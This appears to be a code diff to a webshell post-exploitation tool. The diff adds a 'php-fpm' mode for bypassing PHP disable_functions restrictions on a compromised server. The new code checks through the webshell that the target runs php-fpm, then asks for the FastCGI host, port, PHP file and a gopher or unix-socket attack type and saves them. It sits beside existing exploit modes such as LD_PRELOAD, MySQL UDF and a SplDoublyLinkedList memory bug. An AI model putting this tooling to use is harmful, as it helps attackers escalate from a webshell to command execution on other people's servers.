@@ -15,7 +15,9 @@ mode_to_desc_dict = {-1: color.red("closed"),
                      6: color.green("COM"),
                      7: color.green("imap_open"),
                      8: color.green("MYSQL-UDF"),
-                     9:color.green("php7-SplDoublyLinkedList"),}
+                     9: color.green("php7-SplDoublyLinkedList"),
+                     10: color.green("php-fpm"),
+                     }
 mode_linux_set = {1, 2, 3, 4, 5, 9}
 mode_windows_set = {6, }
 mode_require_ext_dict = {5: "FFI", 6: "com_dotnet", 7: "imap"}
@@ -41,6 +43,15 @@ def get_detectd_ext(extname: str):
 
 
 def set_mode(mode: int, test: bool = False):
+    if (mode in mode_require_ext_dict):
+        ext = mode_require_ext_dict[mode]
+        res = send(get_detectd_ext(ext))
+        if (not res):
+            return False
+        text = res.r_text.strip()
+        if ("exist" not in text):
+            print(color.red(f"\nNo {ext} extension\n"))
+            return False
     if (mode == 4 and not gget("webshell.ld_preload_path", "webshell", False)):  # ld_preload
         disable_func_list = gget("webshell.disable_functions", "webshell")
         if (not gget("webshell.ld_preload_path", "webshell", None)):
@@ -58,16 +69,7 @@ def set_mode(mode: int, test: bool = False):
             if (not ld_preload_func):
                 print(color.red("\nNo ld_preload function!\n"))
                 return False
-    if (mode in mode_require_ext_dict):
-        ext = mode_require_ext_dict[mode]
-        res = send(get_detectd_ext(ext))
-        if (not res):
-            return False
-        text = res.r_text.strip()
-        if ("exist" not in text):
-            print(color.red(f"\nNo {ext} extension\n"))
-            return False
-    if (mode == 8):  # udf
+    elif (mode == 8):  # udf
         if (gget("db_connected", "webshell") and gget("db_dbms", "webshell") == "mysql"):
             print(color.yellow(f"\nDetect plugin dir..."))
             plugin_dir_res = execute_sql_command(
@@ -116,6 +118,36 @@ def set_mode(mode: int, test: bool = False):
         else:
             print(color.red(f"\nNo connection to database or dbms isn't mysql\n"))
             return False
+    elif (mode == 10):  # php-fpm
+        res = send("print(php_sapi_name());")
+        if (not res or "fpm" not in res.r_text):
+            print(color.red(f"\nTarget php not run by php-fpm!\n"))
+            return False
+        requirements_dict = {'host': '127.0.0.1', 'port': 9000, "php_file": "/usr/local/lib/php/PEAR.php"}
+        for k, v in requirements_dict.items():
+            new_v = input(f"{k}[{v}]:")
+            if k == 'port':
+                new_v = new_v if new_v else v
+                try:
+                    new_v = int(new_v)
+                except ValueError:
+                    print(color.red(f"\nPort must be number!\n"))
+                    return False
+            if new_v:
+                requirements_dict[k] = new_v
+        attack_type = input("attack_type[gopher/sock]:").lower()
+        if (attack_type not in ["gopher", "sock"]):
+            return False
+        if (attack_type == "sock"):
+            sock_path = "/var/run/php7-fpm.sock"
+            new_v = input(f"sock_path[{sock_path}]:")
+            if new_v:
+                sock_path = new_v
+            gset("webshell.bdf_fpm.sock_path", sock_path, True, "webshell")
+        gset("webshell.bdf_fpm.host", requirements_dict["host"], True, "webshell")
+        gset("webshell.bdf_fpm.port", str(requirements_dict["port"]), True, "webshell")
+        gset("webshell.bdf_fpm.php_file", requirements_dict["php_file"], True, "webshell")
+        gset("webshell.bdf_fpm.type", attack_type, True, "webshell")
     if (not test):
         if (mode == 7):
             print(color.yellow(
@@ -206,8 +238,8 @@ def run(mode: str = '0'):
         Need:
         - db_init
         - mysql >= 5.1
-    
-    Mode 9 php7-plDoublyLinkedList:
+
+    Mode 9 php7-splDoublyLinkedList:
 
         Origin:
         - https://www.freebuf.com/vuls/251017.html
@@ -217,6 +249,15 @@ def run(mode: str = '0'):
         - 7.2 - all versions to date
         - 7.3 - all versions to date
         - 7.4 < 7.4.11
+
+    Mode 10 php-fpm
+
+        Origin:
+        - https://xz.aliyun.com/t/5598
+
+        Need:
+        - php-fpm
+          - gopher type: curl extension
 
     """
     if (mode == "close"):
